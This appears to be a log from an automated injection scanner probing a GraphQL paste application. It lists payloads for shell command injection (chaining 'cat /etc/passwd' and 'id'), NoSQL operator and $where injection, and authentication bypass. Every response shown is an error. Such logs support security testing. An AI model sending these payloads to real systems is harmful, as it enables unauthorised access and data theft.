2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:06:28,261 | INFO    | InjectionTester      | plain_uname                    | createPaste.content  | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,264 | INFO    | InjectionTester      | chain_semicolon                | createPaste.content  | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 99}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,267 | INFO    | InjectionTester      | chain_pipe                     | createPaste.content  | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 99}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,271 | INFO    | InjectionTester      | chain_and                      | createPaste.content  | POST | success  |  0.003s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:28,274 | INFO    | InjectionTester      | plain_cat_passwd               | createPaste.content  | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,277 | INFO    | InjectionTester      | space_semicolon_cat            | createPaste.content  | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,280 | INFO    | InjectionTester      | space_pipe_cat                 | createPaste.content  | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,283 | INFO    | InjectionTester      | space_and_cat                  | createPaste.content  | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,285 | INFO    | InjectionTester      | mongo_ne_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$ne\": \"\"}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:06:28,287 | INFO    | InjectionTester      | mongo_gt_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$gt\": \"\"}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:06:28,289 | INFO    | InjectionTester      | mongo_gte_operator             | createPaste.content  | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$gte\": \"\"}\", public: true, title: \"test\") { id content title su…]
2026-02-03 20:06:28,291 | INFO    | InjectionTester      | mongo_lt_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$lt\": \"~\"}\", public: true, title: \"test\") { id content title su…]
2026-02-03 20:06:28,293 | INFO    | InjectionTester      | mongo_regex_all                | createPaste.content  | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$regex\": \".*\"}\", public: true, title: \"test\") { id content titl…]
2026-02-03 20:06:28,295 | INFO    | InjectionTester      | mongo_regex_admin              | createPaste.content  | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$regex\": \"^admin\"}\", public: true, title: \"test\") { id content …]
2026-02-03 20:06:28,297 | INFO    | InjectionTester      | mongo_in_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\", public: true, title: \"tes…]
2026-02-03 20:06:28,299 | INFO    | InjectionTester      | mongo_nin_operator             | createPaste.content  | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$nin\": [\"impossible_value_xyz\"]}\", public: true, title: \"test\")…]
2026-02-03 20:06:28,301 | INFO    | InjectionTester      | mongo_exists_true              | createPaste.content  | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$exists\": true}\", public: true, title: \"test\") { id content title…]
2026-02-03 20:06:28,304 | INFO    | InjectionTester      | mongo_or_bypass                | createPaste.content  | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\", public: true, title: \"tes…]
2026-02-03 20:06:28,307 | INFO    | InjectionTester      | mongo_where_true               | createPaste.content  | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 94}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,310 | INFO    | InjectionTester      | mongo_where_1_eq_1             | createPaste.content  | POST | success  |  0.003s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,313 | INFO    | InjectionTester      | mongo_where_sleep              | createPaste.content  | POST | success  |  0.003s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,317 | INFO    | InjectionTester      | mongo_where_this               | createPaste.content  | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:28,320 | INFO    | InjectionTester      | mongo_where_function           | createPaste.content  | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:28,323 | INFO    | InjectionTester      | mongo_where_tojsononeline      | createPaste.content  | POST | success  |  0.003s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 109}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:06:28,325 | INFO    | InjectionTester      | graphql_nested_ne              | createPaste.content  | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"password\": {\"$ne\": \"\"}}\", public: true, title: \"test…]
2026-02-03 20:06:28,327 | INFO    | InjectionTester      | graphql_nested_gt              | createPaste.content  | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"password\": {\"$gt\": \"\"}}\", public: true, title: \"test…]
2026-02-03 20:06:28,329 | INFO    | InjectionTester      | graphql_nested_regex           | createPaste.content  | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \…]
2026-02-03 20:06:28,331 | INFO    | InjectionTester      | graphql_array_injection        | createPaste.content  | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:53) Expected :, found String \", {\"\n\n1: mutation { createPaste(burn: true, content: \"[\"admin\", {\"$gt\": \"\"}]\", public: true, title: \"test\")…]
2026-02-03 20:06:28,333 | INFO    | InjectionTester      | auth_bypass_ne_empty           | createPaste.content  | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$ne\": null}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:06:28,337 | INFO    | InjectionTester      | semicolon_id                   | createPaste.title    | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,340 | INFO    | InjectionTester      | pipe_id                        | createPaste.title    | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,343 | INFO    | InjectionTester      | double_pipe_id                 | createPaste.title    | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 84}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,347 | INFO    | InjectionTester      | and_id                         | createPaste.title    | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 85}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
